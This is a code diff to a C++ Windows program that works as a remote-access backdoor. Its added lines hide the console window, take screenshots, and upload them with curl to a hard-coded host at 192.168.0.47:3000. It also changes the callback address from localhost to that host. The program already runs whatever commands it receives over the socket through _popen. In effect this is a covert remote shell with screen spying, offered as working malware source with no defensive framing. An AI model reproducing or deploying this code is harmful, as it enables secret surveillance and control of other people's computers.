@@ -3,13 +3,84 @@
 #include <WS2tcpip.h>
 #include <string>
 #include <array>
+#include <Windows.h>
+#define STB_IMAGE_WRITE_IMPLEMENTATION
+#include "stb_image_write.h"
+#include <vector>
+
 #pragma comment(lib, "ws2_32.lib")
+
+#define ipAddress "192.168.0.47"
 
 using namespace std;
 
+void HideConsole()
+{
+    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
+}
+
+void ShowConsole()
+{
+    ::ShowWindow(::GetConsoleWindow(), SW_SHOW);
+}
+void TakeScreenShot()
+{
+    int width = GetSystemMetrics(SM_CXSCREEN);
+    int height = GetSystemMetrics(SM_CYSCREEN);
+
+    HDC hdcScreen = GetDC(NULL);
+    HDC hdcMem = CreateCompatibleDC(hdcScreen);
+    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
+    HGDIOBJ hOld = SelectObject(hdcMem, hBitmap);
+
+    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
+
+    // Obter os dados do bitmap
+    BITMAPINFOHEADER bmih;
+    bmih.biSize = sizeof(BITMAPINFOHEADER);
+    bmih.biWidth = width;
+    bmih.biHeight = height;  // Menos indica que a imagem é orientada para cima
+    bmih.biPlanes = 1;
+    bmih.biBitCount = 32;
+    bmih.biCompression = BI_RGB;
+    bmih.biSizeImage = 0;
+    bmih.biXPelsPerMeter = 0;
+    bmih.biYPelsPerMeter = 0;
+    bmih.biClrUsed = 0;
+    bmih.biClrImportant = 0;
+
+    // Obtém os dados do bitmap
+    std::vector<uint8_t> bitmapData(width * height * 4);
+    GetDIBits(hdcScreen, hBitmap, 0, height, bitmapData.data(), (BITMAPINFO*)&bmih, DIB_RGB_COLORS);
+
+    // Libera recursos GDI
+    SelectObject(hdcMem, hOld);
+    DeleteObject(hBitmap);
+    DeleteDC(hdcMem);
+    ReleaseDC(NULL, hdcScreen);
+
+    // Salva a imagem em JPEG
+    stbi_flip_vertically_on_write(1);  // Inverte verticalmente a imagem (necessário para o stb_image_write)
+    stbi_write_jpg("screenshot.jpg", width, height, 4, bitmapData.data(), 100);
+
+    
+    // Limpar recursos
+    SelectObject(hdcMem, hOld);
+    DeleteObject(hBitmap);
+    DeleteDC(hdcMem);
+    ReleaseDC(NULL, hdcScreen);
+    
+
+    std::cout << "Captura de tela salva como 'screenshot.jpg'" << std::endl;
+}
 std::string executeCommand(std::string command)
 {
     cout << "Executing: " << command;
+    if (command == "ss") {
+        TakeScreenShot();
+        command = "curl -T screenshot.jpg http://192.168.0.47:3000/screenshot.jpg";
+        //return "Screenshot Saved";
+    }
     std::string result = "";
     std::array<char, 128> buffer;
     FILE* pipe(_popen(command.c_str(), "r"));
@@ -28,7 +99,8 @@ std::string executeCommand(std::string command)
 
 void main()
 {
-    string ipAddress = "127.0.0.1";
+    HideConsole();
+    
     int port = 54000;
 
     // Inicializa o WinSock
@@ -54,7 +126,7 @@ void main()
     sockaddr_in hint;
     hint.sin_family = AF_INET;
     hint.sin_port = htons(port);
-    inet_pton(AF_INET, ipAddress.c_str(), &hint.sin_addr);
+    inet_pton(AF_INET, ipAddress, &hint.sin_addr);
 
     // Conecta ao servidor
     int connectionResult = connect(sock, (sockaddr*)&hint, sizeof(hint));
